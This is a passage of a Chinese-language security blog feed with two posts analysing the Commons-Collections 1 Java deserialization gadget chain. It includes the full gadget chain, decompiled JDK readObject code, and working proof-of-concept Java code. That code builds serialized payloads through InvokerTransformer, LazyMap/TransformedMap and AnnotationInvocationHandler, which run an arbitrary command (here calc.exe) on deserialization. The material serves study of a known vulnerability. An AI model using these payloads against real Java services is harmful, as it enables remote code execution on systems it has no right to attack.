proxyMap);</span><br></pre></td></tr></table></figure><p>所以接下来就会执行<code>AnnotationInvocationHandler</code>的<code>invoke()</code>方法，接着调用<code>LazyMap#get()</code>触发后面的利用链</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220426003833650-887299424.png" alt="image-20220426003829666"></p><p>进入<code>get()</code>方法，如下，后面就和之前的利用过程一致了</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220426003854700-2086954144.png" alt="image-20220426003853411"></p><p>完整的利用链如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">ObjectInputStream.readObject()</span><br><span class="line">AnnotationInvocationHandler.readObject()</span><br><span class="line">Map(Proxy).entrySet()</span><br><span class="line">AnnotationInvocationHandler.invoke()</span><br><span class="line">LazyMap.get()</span><br><span class="line">ChainedTransformer.transform()</span><br><span class="line">ConstantTransformer.transform()</span><br><span class="line">InvokerTransformer.transform()</span><br><span class="line">Method.invoke()</span><br><span class="line">Class.getMethod()</span><br><span class="line">InvokerTransformer.transform()</span><br><span class="line">Method.invoke()</span><br><span class="line">Runtime.getRuntime()</span><br><span class="line">InvokerTransformer.transform()</span><br><span class="line">Method.invoke()</span><br><span class="line">Runtime.exec()</span><br></pre></td></tr></table></figure><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>CC1这条链里面是有版本限制的，在高版本中对<code>readObject()</code>方法进行了修改，经过测试jdk &lt; 8u71，可以利用成功</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">jdk1.7.0_21 【成功】</span><br><span class="line">private void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException &#123;</span><br><span class="line">        var1.defaultReadObject();</span><br><span class="line">        AnnotationType var2 = null;</span><br><span class="line"></span><br><span class="line">        try &#123;</span><br><span class="line">            var2 = AnnotationType.getInstance(this.type);</span><br><span class="line">        &#125; catch (IllegalArgumentException var9) &#123;</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Map var3 = var2.memberTypes();</span><br><span class="line">        Iterator var4 = this.memberValues.entrySet().iterator();</span><br><span class="line"></span><br><span class="line">        while(var4.hasNext()) &#123;</span><br><span class="line">            Entry var5 = (Entry)var4.next();</span><br><span class="line">            String var6 = (String)var5.getKey();</span><br><span class="line">            Class var7 = (Class)var3.get(var6);</span><br><span class="line">            if (var7 != null) &#123;</span><br><span class="line">                Object var8 = var5.getValue();</span><br><span class="line">                if (!var7.isInstance(var8) &amp;&amp; !(var8 instanceof ExceptionProxy)) &#123;</span><br><span class="line">                    var5.setValue((new AnnotationTypeMismatchExceptionProxy(var8.getClass() + &quot;[&quot; + var8 + &quot;]&quot;)).setMember((Method)var2.members().get(var6)));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">jdk1.8.0_171 【失败】</span><br><span class="line">private void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException &#123;</span><br><span class="line">        GetField var2 = var1.readFields();</span><br><span class="line">        Class var3 = (Class)var2.get(&quot;type&quot;, (Object)null);</span><br><span class="line">        Map var4 = (Map)var2.get(&quot;memberValues&quot;, (Object)null);</span><br><span class="line">        AnnotationType var5 = null;</span><br><span class="line"></span><br><span class="line">        try &#123;</span><br><span class="line">            var5 = AnnotationType.getInstance(var3);</span><br><span class="line">        &#125; catch (IllegalArgumentException var13) &#123;</span><br><span class="line">            throw new InvalidObjectException(&quot;Non-annotation type in annotation serial stream&quot;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Map var6 = var5.memberTypes();</span><br><span class="line">        LinkedHashMap var7 = new LinkedHashMap();</span><br><span class="line"></span><br><span class="line">        String var10;</span><br><span class="line">        Object var11;</span><br><span class="line">        for(Iterator var8 = var4.entrySet().iterator(); var8.hasNext(); var7.put(var10, var11)) &#123;</span><br><span class="line">            Entry var9 = (Entry)var8.next();</span><br><span class="line">            var10 = (String)var9.getKey();</span><br><span class="line">            var11 = null;</span><br><span class="line">            Class var12 = (Class)var6.get(var10);</span><br><span class="line">            if (var12 != null) &#123;</span><br><span class="line">                var11 = var9.getValue();</span><br><span class="line">                if (!var12.isInstance(var11) &amp;&amp; !(var11 instanceof ExceptionProxy)) &#123;</span><br><span class="line">                    var11 = (new AnnotationTypeMismatchExceptionProxy(var11.getClass() + &quot;[&quot; + var11 + &quot;]&quot;)).setMember((Method)var5.members().get(var10));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        AnnotationInvocationHandler.UnsafeAccessor.setType(this, var3);</span><br><span class="line">        AnnotationInvocationHandler.UnsafeAccessor.setMemberValues(this, var7);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.cnblogs.com/nice0e3/p/13798371.html">https://www.cnblogs.com/nice0e3/p/13798371.html</a></p>]]></content>
    
    
    <summary type="html">&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;/&gt;

&lt;h3 id=&quot;cc链的另一种构造方式&quot;&gt;&lt;a href=&quot;#cc链的另一种构造方式&quot; class=&quot;headerlink&quot; title=&quot;cc链的另一种构造方式&quot;&gt;&lt;/a&gt;cc链的另一种构造方式&lt;/h3&gt;&lt;p&gt;接着上篇的分析，上文中讲到&lt;code&gt;LazyMap&lt;/code&gt;通过&lt;code&gt;get()&lt;/code&gt;方法可以达到利用链触发命令执行&lt;/p&gt;</summary>
    
    
    
    <category term="Java安全" scheme="https://kpa1on.github.io/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="cc链" scheme="https://kpa1on.github.io/tags/cc%E9%93%BE/"/>
    
  </entry>
  
  <entry>
    <title>Java安全之Commons-Collections1分析（二）</title>
    <link href="https://kpa1on.github.io/2022/04/24/Java%E5%AE%89%E5%85%A8%E4%B9%8BCommons-Collections1%E5%88%86%E6%9E%90%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
    <id>https://kpa1on.github.io/2022/04/24/Java%E5%AE%89%E5%85%A8%E4%B9%8BCommons-Collections1%E5%88%86%E6%9E%90%EF%BC%88%E4%BA%8C%EF%BC%89/</id>
    <published>2022-04-24T07:41:03.000Z</published>
    <updated>2022-04-24T17:53:11.728Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><p>继续接着上文，上文我们通过方法调用弹出了计算器，那么在反序列化的漏洞场景下该如何运用呢。</p><span id="more"></span><p>下面为完整的调用链</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">ObjectInputStream.readObject()</span><br><span class="line">AnnotationInvocationHandler.readObject()</span><br><span class="line">Map(Proxy).entrySet()</span><br><span class="line">AnnotationInvocationHandler.invoke()</span><br><span class="line">LazyMap.get()</span><br><span class="line">ChainedTransformer.transform()</span><br><span class="line">ConstantTransformer.transform()</span><br><span class="line">InvokerTransformer.transform()</span><br><span class="line">Method.invoke()</span><br><span class="line">Class.getMethod()</span><br><span class="line">InvokerTransformer.transform()</span><br><span class="line">Method.invoke()</span><br><span class="line">Runtime.getRuntime()</span><br><span class="line">InvokerTransformer.transform()</span><br><span class="line">Method.invoke()</span><br><span class="line">Runtime.exec()</span><br></pre></td></tr></table></figure><h3 id="LazyMap"><a href="#LazyMap" class="headerlink" title="LazyMap"></a>LazyMap</h3><p>在分析调用链之前，先学习一下<code>LazyMap</code>，这个类和<code>TransformedMap</code>类似，都继承<code>AbstractMapDecorator</code>抽象类</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220424181355248-164962512.png" alt="image-20220424181354526"></p><p>根据之前的分析，可以知道<code>TransformedMap</code>的触发点是put()方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">put()-&gt;transformValue()-&gt;ChainedTransformer#transform()</span><br></pre></td></tr></table></figure><p>而<code>LazyMap</code>的触发点是在get()方法</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220424184102740-394006463.png" alt="image-20220424184103297"></p><p>get()方法的实现是首先判断map的中是否包含传入的key，当key不存在时，就会调用<code>transformerChain</code>的transform()方法。那么，我们根据这个触发点来编写如下poc</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">public static void main(String[] args) throws Exception &#123;</span><br><span class="line">       //此处构建了一个transformers的数组，在其中构建了任意函数执行的核心代码</span><br><span class="line">       Transformer[] transformers = new Transformer[] &#123;</span><br><span class="line">               new ConstantTransformer(Runtime.class),</span><br><span class="line">               new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123;String.class, Class[].class &#125;, new Object[] &#123;&quot;getRuntime&quot;, new Class[0] &#125;),</span><br><span class="line">               new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;Object.class, Object[].class &#125;, new Object[] &#123;null, new Object[0] &#125;),</span><br><span class="line">               new InvokerTransformer(&quot;exec&quot;, new Class[] &#123;String.class &#125;, new Object[] &#123;&quot;calc.exe&quot;&#125;)</span><br><span class="line">       &#125;;</span><br><span class="line"></span><br><span class="line">       //将transformers数组存入ChaniedTransformer这个继承类</span><br><span class="line">       Transformer transformerChain = new ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">       //创建Map并绑定transformerChina</span><br><span class="line">       Map innerMap = new HashMap();</span><br><span class="line">       innerMap.put(&quot;value&quot;, &quot;value&quot;);</span><br><span class="line">       </span><br><span class="line">       Map tmpmap = LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line">       tmpmap.get(&quot;1&quot;);</span><br><span class="line"></span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>运行完get()方法弹出计算器</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220425003117682-2015149661.png" alt="image-20220425003115659"></p><h3 id="AnnotationInvocationHandler"><a href="#AnnotationInvocationHandler" class="headerlink" title="AnnotationInvocationHandler"></a>AnnotationInvocationHandler</h3><p><code>AnnotationInvocationHandler</code>类的构造函数有两个参数，第⼀个参数是⼀个Annotation类类型参数，该类是注解类，第二个是map类型参数。</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220425003631092-1481504679.png" alt="image-20220425003629840"></p><p>所有的注解类型都继承自Annotation接口</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220425003958204-372179627.png" alt="image-20220425003956842"></p><p>查看<code>AnnotationInvocationHandler#readObject</code>方法</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220425004348631-2058048733.png" alt="image-20220425004347242"></p><p>假设这里我们通过反射调用<code>AnnotationInvocationHandler</code>，并传入两个参数，一个是<code>Retention.class</code>，另一个是<code>outerMap</code>。<code>Retention</code>是一个注解类。<code>outerMap</code>是我们<code>TransformedMap</code>修饰过的类。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Class  clazz = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class="line">    Constructor construct = clazz.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">    construct.setAccessible(true);</span><br><span class="line">    InvocationHandler handler = (InvocationHandler)construct.newInstance(Retention.class, outerMap);</span><br></pre></td></tr></table></figure><p>这时候在 <code>AnnotationInvocationHandler</code>的<code>readObject</code>方法里面 <code>memberValues</code>就是我们使用反射传入的 <code>TransformedMap</code>的对象。代码中遍历了它的所有元素，并依次设置值。在调用<code>setValue</code>设置值的时候就会触发<code>TransformedMap</code>⾥的<code>Transform</code>方法，从而导致命令的执行。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">for (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;</span><br><span class="line">      // for (Map.Entry&lt;String, Object&gt; memberValue : streamVals.entrySet()) &#123;</span><br><span class="line">            String name = memberValue.getKey();</span><br><span class="line">           Object value = null;</span><br><span class="line">            Class&lt;?&gt; memberType = memberTypes.get(name);</span><br><span class="line">            if (memberType != null) &#123;  // i.e. member still exists</span><br><span class="line">               Object value = memberValue.getValue();</span><br><span class="line">               value = memberValue.getValue();</span><br><span class="line">                if (!(memberType.isInstance(value) ||</span><br><span class="line">                      value instanceof ExceptionProxy)) &#123;</span><br><span class="line">                   memberValue.setValue(</span><br><span class="line">                       new AnnotationTypeMismatchExceptionProxy(</span><br><span class="line">                   value = new AnnotationTypeMismatchExceptionProxy(</span><br><span class="line">                            value.getClass() + &quot;[&quot; + value + &quot;]&quot;).setMember(</span><br><span class="line">                               annotationType.members().get(name)));</span><br><span class="line">                               annotationType.members().get(name));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">           mv.put(name, value);</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure><h3 id="POC分析"><a href="#POC分析" class="headerlink" title="POC分析"></a>POC分析</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">public static void main(String[] args) &#123;</span><br><span class="line">        </span><br><span class="line">            Transformer[] transformers = new Transformer[] &#123;</span><br><span class="line">                    new ConstantTransformer(Runtime.class),</span><br><span class="line">                    new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123;</span><br><span class="line">                            String.class,</span><br><span class="line">                            Class[].class &#125;, new Object[] &#123; &quot;getRuntime&quot;,</span><br><span class="line">                            new Class[0] &#125;),</span><br><span class="line">                    new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;</span><br><span class="line">                            Object.class,</span><br><span class="line">                            Object[].class &#125;, new Object[] &#123; null, new</span><br><span class="line">                            Object[0] &#125;),</span><br><span class="line">                    new InvokerTransformer(&quot;exec&quot;, new Class[] &#123; String.class</span><br><span class="line">                    &#125;,</span><br><span class="line">                            new String[] &#123;</span><br><span class="line">                                    &quot;calc.exe&quot; &#125;),</span><br><span class="line">            &#125;;</span><br><span class="line">            Transformer transformerChain = new</span><br><span class="line">                    ChainedTransformer(transformers);</span><br><span class="line">            Map innerMap = new HashMap();</span><br><span class="line">            innerMap.put(&quot;value&quot;, &quot;xxxx&quot;);</span><br><span class="line">            Map outerMap = TransformedMap.decorate(innerMap, null,</span><br><span class="line">                    transformerChain);</span><br><span class="line">            Class clazz =</span><br><span class="line">                    Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class="line">            Constructor construct = clazz.getDeclaredConstructor(Class.class,</span><br><span class="line">                    Map.class);</span><br><span class="line">            construct.setAccessible(true);</span><br><span class="line">            InvocationHandler handler = (InvocationHandler)</span><br><span class="line">                    construct.newInstance(Retention.class, outerMap);</span><br><span class="line">            ByteArrayOutputStream barr = new ByteArrayOutputStream();</span><br><span class="line">            ObjectOutputStream oos = new ObjectOutputStream(barr);</span><br><span class="line">            oos.writeObject(handler);</span><br><span class="line">            oos.close();</span><br><span class="line">            System.out.println(barr);</span><br><span class="line">            ObjectInputStream ois = new ObjectInputStream(new</span><br><span class="line">                    ByteArrayInputStream(barr.toByteArray()));</span><br><span class="line">            Object o = (Object)ois.readObject();</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行弹出计算器</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220425014904438-114576049.png" alt="image-20220425014902982"></p><p>测试过程发现，jdk1.8.0_321无法达到命令执行的目的，后面换了个jdk1.7.0_21才执行成功</p><p>在高版本中的<code>AnnotationInvocationHandler</code>的<code>readObject</code>是被改动过的，如下为低版本jdk</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220425015123743-612622047.png" alt="image-20220425015122452"></p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.cnblogs.com/nice0e3/p/13791793.html">https://www.cnblogs.com/nice0e3/p/13791793.html</a></p>]]></content>
    
    
    <summary type="html">&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;/&gt;

&lt;p&gt;继续接着上文，上文我们通过方法调用弹出了计算器，那么在反序列化的漏洞场景下该如何运用呢。&lt;/p&gt;</summary>
    
    
    
    <category term="Java安全" scheme="https://kpa1on.github.io/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="cc链" scheme="https://kpa1on.github.io/tags/cc%E9%93%BE/"/>
    
  </entry>
  
</feed>
